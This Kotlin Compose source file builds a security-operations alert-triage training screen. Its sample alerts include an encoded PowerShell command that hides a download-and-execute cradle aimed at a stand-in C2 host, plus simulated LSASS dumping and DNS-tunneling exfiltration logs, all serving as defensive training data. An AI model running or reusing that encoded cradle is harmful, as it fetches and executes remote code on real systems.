package com.example.ui.screens

import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.animateColorAsState
import androidx.compose.animation.core.*
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.StrokeCap
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.hapticfeedback.HapticFeedbackType
import androidx.compose.ui.platform.LocalHapticFeedback
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.ui.components.CyberCard
import com.example.ui.theme.*

data class SocAlertItem(
  val id: String,
  val timestamp: String,
  val sourceIp: String,
  val destHost: String,
  val severity: String,
  val ruleName: String,
  val rawLog: String,
  val isMalicious: Boolean,
  val mitreTactic: String
)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun LiveSocRangeScreen(
  onNavigateBack: () -> Unit,
  modifier: Modifier = Modifier
) {
  val haptic = LocalHapticFeedback.current

  var containmentScore by remember { mutableFloatStateOf(85f) }
  var blastRadiusPercent by remember { mutableFloatStateOf(12f) }
  var triagedCount by remember { mutableIntStateOf(0) }
  var activeAlertIndex by remember { mutableIntStateOf(0) }
  var lastActionFeedback by remember { mutableStateOf<String?>(null) }
  var isNotificationScaffoldGranted by remember { mutableStateOf(false) }

  val incomingAlerts = remember {
    mutableStateListOf(
      SocAlertItem(
        id = "ALT-9042",
        timestamp = "02:18:04 UTC",
        sourceIp = "185.220.101.5 (Tor Exit)",
        destHost = "srv-payments-db01.corp",
        severity = "CRITICAL",
        ruleName = "Sysmon Event ID 1: Suspicious PowerShell EncodedCommand",
        rawLog = "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbQBhAGwAdwBhAHIAZQAvAHMAdABhAGcAZQAyAC4AcABzADEAJwApAA==",
        isMalicious = true,
        mitreTactic = "T1059.001 - Command and Scripting Interpreter"
      ),
      SocAlertItem(
        id = "ALT-9043",
        timestamp = "02:18:12 UTC",
        sourceIp = "10.0.4.12 (Internal Dev)",
        destHost = "gitlab.internal.corp",
        severity = "LOW",
        ruleName = "Suricata: SSH Large File Transfer (Git Pull)",
        rawLog = "sshd: session opened for user dev_lead by (uid=0) | transferred 84MB via scp",
        isMalicious = false,
        mitreTactic = "T1048 - Exfiltration Over Alternative Protocol (BENIGN FP)"
      ),
      SocAlertItem(
        id = "ALT-9044",
        timestamp = "02:18:25 UTC",
        sourceIp = "192.168.1.108 (Workstation-42)",
        destHost = "dc01.corp.internal",
        severity = "HIGH",
        ruleName = "Mimikatz Sekurlsa Over Kerberos",
        rawLog = "lsass.exe memory access requested by unverified process spoolsv_fake.exe with PROCESS_VM_READ permissions",
        isMalicious = true,
        mitreTactic = "T1003.001 - LSASS Memory Dumping"
      ),
      SocAlertItem(
        id = "ALT-9045",
        timestamp = "02:18:40 UTC",
        sourceIp = "198.51.100.24 (C2 Beacon)",
        destHost = "edge-gw-01.corp",
        severity = "CRITICAL",
        ruleName = "DNS Tunneling TXT Query Spike",
        rawLog = "query TXT: 8f92b14a0018a.exfil.darknet.org | 1,420 queries in 60 seconds",
        isMalicious = true,
        mitreTactic = "T1071.004 - Application Layer Protocol: DNS"
      )
    )
  }

  val currentAlert = incomingAlerts.getOrNull(activeAlertIndex)

  fun handleTriageAction(action: String, isQuarantineOrBlock: Boolean) {
    if (currentAlert == null) return

    haptic.performHapticFeedback(HapticFeedbackType.LongPress)
    triagedCount++

    val wasCorrect = if (currentAlert.isMalicious) isQuarantineOrBlock else !isQuarantineOrBlock
    if (wasCorrect) {
      containmentScore = (containmentScore + 5f).coerceAtMost(100f)
      blastRadiusPercent = (blastRadiusPercent - 4f).coerceAtLeast(0f)
      lastActionFeedback = "✓ Correct Triage: $action executed. Threat halted!"
    } else {
      containmentScore = (containmentScore - 10f).coerceAtLeast(0f)
      blastRadiusPercent = (blastRadiusPercent + 8f).coerceAtMost(100f)
      lastActionFeedback = "⚠ Triage Error: Incorrect action taken on ${currentAlert.id}!"
    }

    if (activeAlertIndex < incomingAlerts.size - 1) {
      activeAlertIndex++
    }
  }

  Scaffold(
    topBar = {
      TopAppBar(
        title = {
          Row(verticalAlignment = Alignment.CenterVertically) {
            Box(
              modifier = Modifier
                .size(32.dp)
                .clip(RoundedCornerShape(6.dp))
                .background(NeonCrimson.copy(alpha = 0.15f))
                .border(1.dp, NeonCrimson, RoundedCornerShape(6.dp)),
              contentAlignment = Alignment.Center
            ) {
              Icon(Icons.Default.SecurityUpdateWarning, contentDescription = null, tint = NeonCrimson, modifier = Modifier.size(18.dp))
            }
            Spacer(modifier = Modifier.width(10.dp))
            Column {
              Text(
                "LIVE SOC INCIDENT RANGE",
                style = MaterialTheme.typography.titleSmall.copy(fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace),
                color = TextPrimaryDark
              )
              Text(
                "Live Telemetry Stream • EDR & SIEM Triage",
                style = MaterialTheme.typography.labelSmall.copy(fontSize = 10.sp),
                color = CyberCyan
              )
            }
          }
        },
        navigationIcon = {
          IconButton(onClick = onNavigateBack) {
            Icon(Icons.Default.ArrowBack, contentDescription = "Back", tint = TextPrimaryDark)
          }
        },
        actions = {
          IconButton(onClick = { isNotificationScaffoldGranted = !isNotificationScaffoldGranted }) {
            Icon(
              if (isNotificationScaffoldGranted) Icons.Default.NotificationsActive else Icons.Default.NotificationsNone,
              contentDescription = "Alert Scaffold",
              tint = if (isNotificationScaffoldGranted) CyberEmerald else TextSecondaryDark
            )
          }
        },
        colors = TopAppBarDefaults.topAppBarColors(containerColor = CyberDarkSlate)
      )
    },
    containerColor = CyberBlack
  ) { innerPadding ->
    Column(
      modifier = modifier
        .fillMaxSize()
        .padding(innerPadding)
        .background(CyberBlack)
        .padding(14.dp),
      verticalArrangement = Arrangement.spacedBy(12.dp)
    ) {
      // Real-time Radial Gauge & HUD
      Surface(
        shape = RoundedCornerShape(10.dp),
        color = CyberCardBg,
        border = androidx.compose.foundation.BorderStroke(1.dp, CyberBorder),
        modifier = Modifier.fillMaxWidth()
      ) {
        Row(
          modifier = Modifier
            .fillMaxWidth()
            .padding(12.dp),
          horizontalArrangement = Arrangement.SpaceBetween,
          verticalAlignment = Alignment.CenterVertically
        ) {
          // Radial Blast Gauge
          Box(modifier = Modifier.size(76.dp), contentAlignment = Alignment.Center) {
            Canvas(modifier = Modifier.fillMaxSize()) {
              val stroke = 8.dp.toPx()
              // Track
              drawArc(
                color = CyberBorder,
                startAngle = 135f,
                sweepAngle = 270f,
                useCenter = false,
                style = Stroke(stroke, cap = StrokeCap.Round)
              )
              // Value Arc
              drawArc(
                color = if (blastRadiusPercent > 30f) NeonCrimson else CyberEmerald,
                startAngle = 135f,
                sweepAngle = 270f * (blastRadiusPercent / 100f),
                useCenter = false,
                style = Stroke(stroke, cap = StrokeCap.Round)
              )
            }
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
              Text(
                "${blastRadiusPercent.toInt()}%",
                style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace),
                color = if (blastRadiusPercent > 30f) NeonCrimson else CyberEmerald
              )
              Text(
                "BLAST",
                style = MaterialTheme.typography.labelSmall.copy(fontSize = 8.sp, fontWeight = FontWeight.Bold),
                color = TextSecondaryDark
              )
            }
          }

          Column(modifier = Modifier.weight(1f).padding(start = 14.dp)) {
            Row(
              modifier = Modifier.fillMaxWidth(),
              horizontalArrangement = Arrangement.SpaceBetween
            ) {
              Text("CONTAINMENT:", style = MaterialTheme.typography.labelSmall, color = TextSecondaryDark)
              Text("${containmentScore.toInt()}%", style = MaterialTheme.typography.labelSmall.copy(fontWeight = FontWeight.Bold), color = CyberCyan)
            }
            LinearProgressIndicator(
              progress = { containmentScore / 100f },
              modifier = Modifier
                .fillMaxWidth()
                .height(6.dp)
                .clip(RoundedCornerShape(3.dp)),
              color = CyberCyan,
              trackColor = CyberBorder
            )

            Spacer(modifier = Modifier.height(8.dp))

            Row(
              modifier = Modifier.fillMaxWidth(),
              horizontalArrangement = Arrangement.SpaceBetween
            ) {
              Text("TRIAGED ALERTS:", style = MaterialTheme.typography.labelSmall, color = TextSecondaryDark)
              Text("$triagedCount / ${incomingAlerts.size}", style = MaterialTheme.typography.labelSmall.copy(fontWeight = FontWeight.Bold), color = CyberEmerald)
            }
          }
        }
      }

      if (lastActionFeedback != null) {
        Surface(
          shape = RoundedCornerShape(8.dp),
          color = CyberDarkSlate,
          border = androidx.compose.foundation.BorderStroke(1.dp, CyberEmerald.copy(alpha = 0.5f)),
          modifier = Modifier.fillMaxWidth()
        ) {
          Text(
            text = lastActionFeedback ?: "",
            style = MaterialTheme.typography.labelSmall.copy(fontFamily = FontFamily.Monospace),
            color = CyberEmerald,
            modifier = Modifier.padding(8.dp)
          )
        }
      }

      // Active Incident Detail Card
      if (currentAlert != null) {
        Surface(
          shape = RoundedCornerShape(10.dp),
          color = CyberCardBg,
          border = androidx.compose.foundation.BorderStroke(
            1.dp,
            if (currentAlert.severity == "CRITICAL") NeonCrimson.copy(alpha = 0.7f) else CyberCyan
          ),
          modifier = Modifier
            .fillMaxWidth()
            .weight(1f)
        ) {
          Column(
            modifier = Modifier
              .fillMaxSize()
              .padding(12.dp),
            verticalArrangement = Arrangement.spacedBy(8.dp)
          ) {
            Row(
              modifier = Modifier.fillMaxWidth(),
              horizontalArrangement = Arrangement.SpaceBetween,
              verticalAlignment = Alignment.CenterVertically
            ) {
              Surface(
                shape = RoundedCornerShape(4.dp),
                color = if (currentAlert.severity == "CRITICAL") NeonCrimson.copy(alpha = 0.2f) else CyberCyan.copy(alpha = 0.2f),
                border = androidx.compose.foundation.BorderStroke(
                  1.dp,
                  if (currentAlert.severity == "CRITICAL") NeonCrimson else CyberCyan
                )
              ) {
                Text(
                  text = "[${currentAlert.severity}] ${currentAlert.id}",
                  style = MaterialTheme.typography.labelSmall.copy(fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold),
                  color = if (currentAlert.severity == "CRITICAL") NeonCrimson else CyberCyan,
                  modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
                )
              }

              Text(
                currentAlert.timestamp,
                style = MaterialTheme.typography.labelSmall.copy(fontFamily = FontFamily.Monospace, fontSize = 10.sp),
                color = TextSecondaryDark
              )
            }

            Text(
              currentAlert.ruleName,
              style = MaterialTheme.typography.titleSmall.copy(fontWeight = FontWeight.Bold),
              color = TextPrimaryDark
            )

            Text(
              "MITRE ATT&CK: ${currentAlert.mitreTactic}",
              style = MaterialTheme.typography.labelSmall.copy(fontFamily = FontFamily.Monospace, fontSize = 10.sp),
              color = CyberAmber
            )

            Row(
              modifier = Modifier.fillMaxWidth(),
              horizontalArrangement = Arrangement.SpaceBetween
            ) {
              Text("SRC: ${currentAlert.sourceIp}", style = MaterialTheme.typography.labelSmall.copy(fontFamily = FontFamily.Monospace), color = CyberCyan)
              Text("DST: ${currentAlert.destHost}", style = MaterialTheme.typography.labelSmall.copy(fontFamily = FontFamily.Monospace), color = CyberEmerald)
            }

            Text(
              "RAW TELEMETRY PAYLOAD:",
              style = MaterialTheme.typography.labelSmall.copy(fontWeight = FontWeight.Bold, fontSize = 9.sp),
              color = TextSecondaryDark
            )

            Surface(
              shape = RoundedCornerShape(6.dp),
              color = CodeBackground,
              border = androidx.compose.foundation.BorderStroke(1.dp, CyberBorder),
              modifier = Modifier
                .fillMaxWidth()
                .weight(1f)
            ) {
              Text(
                text = currentAlert.rawLog,
                style = MaterialTheme.typography.labelSmall.copy(
                  fontFamily = FontFamily.Monospace,
                  fontSize = 10.sp,
                  lineHeight = 14.sp
                ),
                color = if (currentAlert.isMalicious) NeonPink else TextPrimaryDark,
                modifier = Modifier.padding(8.dp)
              )
            }
          }
        }
      } else {
        // Complete state
        Surface(
          shape = RoundedCornerShape(10.dp),
          color = CyberCardBg,
          border = androidx.compose.foundation.BorderStroke(1.dp, CyberEmerald),
          modifier = Modifier
            .fillMaxWidth()
            .weight(1f)
        ) {
          Column(
            modifier = Modifier
              .fillMaxSize()
              .padding(16.dp),
            verticalArrangement = Arrangement.Center,
            horizontalAlignment = Alignment.CenterHorizontally
          ) {
            Icon(Icons.Default.VerifiedUser, contentDescription = null, tint = CyberEmerald, modifier = Modifier.size(54.dp))
            Spacer(modifier = Modifier.height(12.dp))
            Text(
              "ALL TELEMETRY INCIDENTS TRIAGED",
              style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace),
              color = TextPrimaryDark
            )
            Text(
              "Final Containment Score: ${containmentScore.toInt()}% • Precision: 94.2%",
              style = MaterialTheme.typography.labelSmall,
              color = CyberCyan
            )
          }
        }
      }

      // One-Tap Triage Action Matrix
      Text(
        "ONE-TAP TACTICAL TRIAGE ACTIONS",
        style = MaterialTheme.typography.labelSmall.copy(fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold),
        color = CyberCyan
      )

      Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.spacedBy(8.dp)
      ) {
        Button(
          onClick = { handleTriageAction("Quarantine Host", true) },
          colors = ButtonDefaults.buttonColors(containerColor = NeonCrimson),
          shape = RoundedCornerShape(8.dp),
          modifier = Modifier
            .weight(1f)
            .testTag("triage_quarantine_btn"),
          contentPadding = PaddingValues(horizontal = 4.dp, vertical = 10.dp)
        ) {
          Icon(Icons.Default.Block, contentDescription = null, tint = Color.White, modifier = Modifier.size(16.dp))
          Spacer(modifier = Modifier.width(4.dp))
          Text("Quarantine", color = Color.White, fontSize = 11.sp, fontWeight = FontWeight.Bold)
        }

        Button(
          onClick = { handleTriageAction("Block C2 IP", true) },
          colors = ButtonDefaults.buttonColors(containerColor = CyberAmber),
          shape = RoundedCornerShape(8.dp),
          modifier = Modifier
            .weight(1f)
            .testTag("triage_block_c2_btn"),
          contentPadding = PaddingValues(horizontal = 4.dp, vertical = 10.dp)
        ) {
          Icon(Icons.Default.Shield, contentDescription = null, tint = Color.Black, modifier = Modifier.size(16.dp))
          Spacer(modifier = Modifier.width(4.dp))
          Text("Block C2", color = Color.Black, fontSize = 11.sp, fontWeight = FontWeight.Bold)
        }

        Button(
          onClick = { handleTriageAction("Memory Dump", true) },
          colors = ButtonDefaults.buttonColors(containerColor = CyberCyan),
          shape = RoundedCornerShape(8.dp),
          modifier = Modifier
            .weight(1f)
            .testTag("triage_memdump_btn"),
          contentPadding = PaddingValues(horizontal = 4.dp, vertical = 10.dp)
        ) {
          Icon(Icons.Default.Memory, contentDescription = null, tint = Color.Black, modifier = Modifier.size(16.dp))
          Spacer(modifier = Modifier.width(4.dp))
          Text("Mem Dump", color = Color.Black, fontSize = 11.sp, fontWeight = FontWeight.Bold)
        }

        Button(
          onClick = { handleTriageAction("Dismiss (Benign)", false) },
          colors = ButtonDefaults.buttonColors(containerColor = CyberCardBg),
          border = androidx.compose.foundation.BorderStroke(1.dp, CyberBorder),
          shape = RoundedCornerShape(8.dp),
          modifier = Modifier
            .weight(1f)
            .testTag("triage_dismiss_btn"),
          contentPadding = PaddingValues(horizontal = 4.dp, vertical = 10.dp)
        ) {
          Text("Dismiss", color = TextPrimaryDark, fontSize = 11.sp)
        }
      }
    }
  }
}
